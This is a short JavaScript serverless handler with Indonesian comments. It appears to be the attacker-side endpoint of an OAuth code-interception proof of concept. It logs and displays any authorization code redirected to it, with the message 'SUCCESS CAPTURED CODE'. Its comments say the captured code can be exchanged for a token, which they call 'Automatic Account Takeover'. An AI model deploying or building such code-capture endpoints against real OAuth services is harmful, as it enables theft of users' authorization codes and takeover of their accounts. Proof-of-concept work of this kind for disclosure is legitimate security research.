// api/callback.js
export default async function handler(req, res) {
    const { code, error, error_description } = req.query;

    if (error) {
        console.error(`OAuth Error: ${error} - ${error_description}`);
        return res.status(400).json({ status: "error", error, error_description });
    }

    if (code) {
        console.log(`[!!!] SUCCESS CAPTURED CODE: ${code}`);
        
        // Opsional: Langsung tukar ke token jika kamu punya client_secret
        // Ini membuktikan "Automatic Account Takeover"
        return res.status(200).send(`
            <h1>OAuth Code Captured!</h1>
            <p>Code: <code>${code}</code></p>
            <p>Cek Vercel Logs untuk detail lengkap.</p>
        `);
    }

    res.status(200).json({ message: "Waiting for OAuth code..." });
}
